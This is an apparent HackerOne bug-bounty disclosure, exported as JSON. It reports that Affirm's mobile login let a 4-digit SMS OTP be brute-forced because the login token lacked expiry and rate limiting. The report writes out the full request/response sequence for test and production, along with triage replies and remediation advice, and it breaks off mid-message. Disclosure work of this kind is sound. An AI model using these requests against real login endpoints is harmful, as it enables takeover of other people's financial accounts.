{"id":766578,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjY1Nzg=","url":"https://hackerone.com/reports/766578","title":"Absence of Token expiry leads to Unauthorized login Access","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-12-31T19:28:39.154Z","submitted_at":"2019-12-31T19:28:39.154Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yogesh_ojha","url":"/yogesh_ojha","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":24883,"url":"https://hackerone.com/affirm","handle":"affirm","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8KSoDJqU7K4QaZkiQ4XzCjuV/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/8KSoDJqU7K4QaZkiQ4XzCjuV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Affirm","twitter_handle":"","website":"http://www.affirm.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-12-01T00:09:45.558Z","bug_reporter_agreed_on_going_public_at":"2020-11-30T19:00:30.187Z","team_member_agreed_on_going_public_at":"2020-12-01T00:09:45.458Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\nWhile doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.\n\nThe way affirm mobile login works is that,\n\nUser inputs the phone number\nIt then makes a call to an API endpoint /api/v3/login/phone/\n```\nPOST /api/v3/login/phone/ HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 40\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.13.1\nAffirm-User-Agent: Affirm-Android\n\n{\"channel\":\"sms\",\"address\":\"7022170000\"}\n```\n\nThis endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.\nThe response looks something similar to this\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 31 Dec 2019 11:53:27 GMT\nContent-Type: application/json\nConnection: close\nServer: openresty\nVary: Accept-Encoding\nAffirm-Device: XXX=\nAffirm-Client: XXXX-\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c\nStrict-Transport-Security: max-age=86400\nContent-Length: 299\n\n{\"response_url\": \"/api/v3/login/phone/SOMETOKEN\"}\n```\n\nAnother call to the api is made to the URL obtained from the above response_url This API request looks like this\n\n```\nPOST /api/v3/login/phone/SOMETOKEN HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 19\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.62.3\nAffirm-App-Version-Code: 312\nAffirm-OS-Version: 22\n\n{\"response\":\"0000\"}\n```\n\nSince SOMETOKEN in the above request doesn't get expired, this request can be sent to Intruder or similar tools to brute force the response OTP parameter.\nOnce the response is valid, this can be verified by the 200 status obtained in the response and the length of the response.\nLike this,\n{F672314}\n\nThe response will be\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 31 Dec 2019 12:30:58 GMT\nContent-Type: application/json\nConnection: close\nServer: openresty\nVary: Accept-Encoding\nAffirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca\nStrict-Transport-Security: max-age=86400\nContent-Length: 109\n\n{\"status\": \"authenticated\", \"token\": null, \"user_id\": \"1479-5770-XGGL\", \"expiration\": \"3019-12-31T17:17:38Z\"}\n```\n\nThis response contains Affirm-Client which is like a session ID, later used to make a request.\n\nTo verify if this is the actual session ID or not, this can be done by making a request to the api\n\n```\nGET /api/v2/users/1479-5770-XGGL HTTP/1.1\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.13.1\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk\nAffirm-Platform: android\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.62.3\nAffirm-App-Version-Code: 312\nAffirm-OS-Version: 22\n```\n\nThe user ID can also be obtained from the above response.\n\nIf the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.\n\n```\n{\"phone_number\": {\"phone_number\": \"+1-702-217-0000\", \"user_id\": \"1479-5770-XGGL\", \"id\": \"CNAIG0U1BMPHN5BK\"}, \"status\": \"ACTIVE\", \"name\": {\"last\": \"NEPAK\", \"full\": \"TESTING NEPAK\", \"user_id\": \"1479-5770-XGGL\", \"id\": \"4ZBC33TYEY12SOWP\", \"first\": \"TESTING\"}, \"is_personalized_services_active\": true, \"created\": \"2019-12-31T10:48:00Z\", \"dob\": \"1980-06-23\", \"id\": \"1479-5770-XGGL\", \"address_confirmation_status\": \"not confirmed\", \"address\": {\"city\": \"San Francisco\", \"user_id\": \"1479-5770-XGGL\", \"is_po_box\": false, \"street1\": \"325 Pacific Ave\", \"region1_code\": \"CA\", \"is_military_address\": false, \"postal_code\": \"94111\", \"country_code\": \"USA\", \"id\": \"G2YM6ESBLH36ETLZ\"}, \"user_consented_to_lto\": null, \"email\": {\"verified\": false, \"user_id\": \"1479-5770-XGGL\", \"email\": \"who_has_no_name+0000@wearehackerone.com\", \"id\": \"B9SUH5XOB1559Q8J\"}}\n```\n{F672319}\n\n### Remediation\nRate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.\nThe fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.\n\nLuckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.\n\nOnce this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.\n\nPOC Video\n{F672564}\n-Happy New year team Affirm \u003c3\n\n## Impact\n\nUnauthorized account access, Account takeover","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":672314,"file_name":"1.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GawqacC3qzn1LFnHJxLQdqNJ?response-content-disposition=attachment%3B%20filename%3D%221.PNG%22%3B%20filename%2A%3DUTF-8%27%271.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7c6575d80453346b22bd1b9a0ac3a78b6d23c0d87592b51db830fc60bf657a53","file_size":27126,"type":"image/png"},{"id":672319,"file_name":"2.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UJcJT6K56pTjFNbhCMGYF5Td?response-content-disposition=attachment%3B%20filename%3D%222.PNG%22%3B%20filename%2A%3DUTF-8%27%272.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1a01e13d53578323eb4d546c3186c64025f2bfadfb3466c203b7293231d37a9a","file_size":89799,"type":"image/png"},{"id":672564,"file_name":"Screen_Recording_2020-01-01_at_12.47.37_AM.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/68XoqHAqkKbuzMPKzSnm1V9t?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-01-01_at_12.47.37_AM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-01-01_at_12.47.37_AM.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a3c1b0332c84902c20ed6ef55f8c7b07213ef7946938f9f67c5c0e17c4474667","file_size":36255947,"type":"video/quicktime"}],"allow_singular_disclosure_at":"2020-12-30T19:00:30.287Z","allow_singular_disclosure_after":-24611062.932242814,"singular_disclosure_allowed":true,"vote_count":138,"voters":["ganeshbagaria","sw33tlie","bendtheory","xploiterr","run_win","n0x496n","zonduu","dexter0us","vapour","emanuelharijanto","and 128 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":{"databaseId":9646,"asset_type":"GOOGLE_PLAY_APP_ID","asset_identifier":"com.affirm.central.audit","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6667106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @who_has_no_name,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@bassguitar ","automated_response":false,"created_at":"2019-12-31T22:40:16.403Z","updated_at":"2019-12-31T22:40:16.403Z","actor":{"username":"bassguitar","cleared":false,"url":"/bassguitar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/352/794/5d82b321348f78aa4ac9c82c0bdd004828bcb414_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6684437,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @who_has_no_name, on production, we do have an account locking mechanism for protecting brute forcing the OTP. I'm not sure why this is expolitable on the ODIN testing environment...but can you reproduce this on production? Also, is this a mobile only exploit, or it's a general vulnerability on the login API?","automated_response":false,"created_at":"2020-01-03T22:45:39.688Z","updated_at":"2020-01-03T22:45:39.688Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6684456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name and when you reproduce this on production, please use a number controlled by yourself. Much appreciated!","automated_response":false,"created_at":"2020-01-03T22:49:24.773Z","updated_at":"2020-01-03T22:49:24.773Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6684480,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-01-03T22:52:27.434Z","updated_at":"2020-01-03T22:52:27.434Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6695619,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Production has SSL pinning, I will need some time to reproduce this as I need to bypass SSL pinning. Is there any way you can provide me the request/api endpoint for login in production?","automated_response":false,"created_at":"2020-01-06T05:06:59.989Z","updated_at":"2020-01-06T05:06:59.989Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6701609,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The odin testing environment is a mirror of the production environment, so the endpoints are the same, and you can just replace the host from `hackerone.affirm-odin.com` to `api.affirm.com` or `api-cf.affirm.com`. Thank you!","automated_response":false,"created_at":"2020-01-06T19:26:42.075Z","updated_at":"2020-01-06T19:26:42.075Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6701655,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name To be honest, I'm very sure that the account locking mechanism on production protects OTP brute force pretty well, so I don't know if it's worthy your time on this...","automated_response":false,"created_at":"2020-01-06T19:31:48.880Z","updated_at":"2020-01-06T19:31:48.880Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6725387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @xiuxiu_3803,\n\nI took this as a challenge and I guess I deserve a bonus for this ;) \n\nI am able to bypass the OTP brute force in production as well. Let me document this.\n","automated_response":false,"created_at":"2020-01-09T10:36:21.396Z","updated_at":"2020-01-09T10:36:21.396Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6725399,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name wow......I look forward to your report!","automated_response":false,"created_at":"2020-01-09T10:37:47.306Z","updated_at":"2020-01-09T10:37:47.306Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6729352,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For 3 days, I went crazy without sleep and here is it @xiuxiu_3803\nAnd after 3 days, boom, I am able to bypass the authentication and brute force is really possible.\n\nThe reproduction steps are more or less the same as above in production as well.\n\nWhen the user enters the phone number, the production API first makes the request to\n\n```\nPOST /api/v3/login/phone/ HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 40\nHost: api-cf.affirm.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.12.0\nAffirm-Platform: android\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.34.4\nAffirm-App-Version-Code: 226\nAffirm-OS-Version: 22\n\n{\"channel\":\"sms\",\"address\":\"6464007658\"}\n```\nI have removed extra parameters in this request.\n\nNow, the response of this API will be\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\nConnection: close\nDate: Thu, 09 Jan 2020 10:31:29 GMT\nServer: openresty\nVary: Accept-Encoding\nAffirm-Device: eyJkZXZpY2VfaWQiOiAiMjlmODVmMmItYjQ3ZC00ZWQ1LTgyNGQtMzFjOTcwOTcwZWYxIn0=\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8vEPDAwJNzM39vdw83DyClHSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGQvGq8.EPiSgQ.GpdgagvT3WcCsp7Fq_J0r5eWefA\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: 58415f09-6357-4a8f-caa3-ebfb9984a513\nStrict-Transport-Security: max-age=86400\nX-Cache: Miss from cloudfront\nVia: 1.1 f7bf326347bdd7f275a38a22b5b83724.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: FRA2-C1\nX-Amz-Cf-Id: NkCRTKCCLyoEwftPHsAyuEgSTbDRqGoLtQB8GhBB2jJgFDaz64Yajg==\nContent-Length: 299\n\n{\"response_url\": \"/api/v3/login/phone/AhL5-rmOwkFv6gVoFJgHzhCtMMx3dHjDzc0zJK7tAgEwraBWQ4vPVepQGpwL7GZogz6dbhmJFaZE2Ntpjpm9XbETK1ONUehzHdOs9PttVzrjNw5miEYQ9DbeVsPIa-0e33J2Eh-D12WtJAaUaBQCLU55jgUF-bSHgfnUYfP-AuTy9ttTtGwTimeS-tkd1H5Lo3GMpc2avtr-N3r7-gEdv6grsbqlVMuRb1aW0aCk1sOqL2-VfeLaBTBSc8z_47psZU4\"}\n```\nThe ==response_url== is the token/URL that the API will request forward to.\n\n```\nPOST /api/v3/login/phone/AhL5-rmOwkFv6gVoFJgHzhCtMMx3dHjDzc0zJK7tAgEwraBWQ4vPVepQGpwL7GZogz6dbhmJFaZE2Ntpjpm9XbETK1ONUehzHdOs9PttVzrjNw5miEYQ9DbeVsPIa-0e33J2Eh-D12WtJAaUaBQCLU55jgUF-bSHgfnUYfP-AuTy9ttTtGwTimeS-tkd1H5Lo3GMpc2avtr-N3r7-gEdv6grsbqlVMuRb1aW0aCk1sOqL2-VfeLaBTBSc8z_47psZU4 HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 1376\nHost: api-cf.affirm.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.12.0\nAffirm-Platform: android\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.34.4\nAffirm-App-Version-Code: 226\nAffirm-OS-Version: 22\n\n{\"response\":\"7000\"}\n```\n==Again, in this request, I have removed extra parameters as per my need.==\n\nThe parameter ==response== is responsible for the 4 digit OTP.\n\nFurther, I will be sending this request to the intruder in order to brute force the OTP\n\n{F679541}\n\nThe payload options [Numbers] can be as per the attacker's wish.\n\nBut, there's a catch here. Instead of having the rate-limiting, or making the OTP after certain invalid attempts, the OTP is time-based. The OTP expires in 5 minutes or so. Now an attacker can always increase the threads in order to brute force more quickly before the OTP expires. \n\nAlso, even if the OTP expires, an attacker can request for new OTP as many times as he wishes. I did not notice any rate limiting on the first request that generates the ==response_url== as well.\n\n\n# POC\nI am sorry, the video is a little longer :( 4 mins\n{F679875}\n\n## What went wrong here?\nThere are a few things that went wrong. \n1. I did not see any account lockout mechanism.\n2. The token or ==response_url== that is generated initially doesn't have rate limiting. An attacker can generate as many ==response_url== as he wishes.\n3. The OTP has time-based limiting rather than the attempts based limiting. The OTP expires after 5 minutes or so rather than 5 failed attempts. \nI did not find any rate-limiting even after 100s of requests for the same OTP/token.\n\nOne of the examples is this, even after 100 failed OTP attempts, it still validates the OTP\n{F679822}\n\n## What can be done?\n1. The initial ==response_url== must be rate limited. A user should be allowed to request the response_url or token once in every 5 minutes.\n2. Using this token, an OTP is generated and then once multiple failed OTP attempts are made, invalidate the ==request_url==. Any further request to this ==request_url== is anyways invalid.\n3. Now even if an attacker tries to bypass any of these, he will be again stuck at generating ==request_url== because the earlier URL is invalid after 5 invalid attempts. Now in order to generate new OTP he has to request another URL which can be done only once in 5 minutes. \n4. IP Source-based limiting can also be done, if an attacker is continuously flooding with the request, the IP/account can be locked out for a certain period of time, say 24 hours. \n\nAlso, now since I am able to replicate this on a production system and able to bypass the authentication, your customer's data and the entire business are on the stake. Can you kindly increase the severity to Critical as I am able to bypass Authentication and login to anybody's account and even Takeover is possible. Should you need POC for takeover as well, I will provide it. \nFeel free to correct me, but here's my CVSS Score: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 9.8 Ctirical\n\nIt's 11:54 PM in India, and I am gonna have a good night's sleep after 3 days. :)\n\nAlso, please fix this 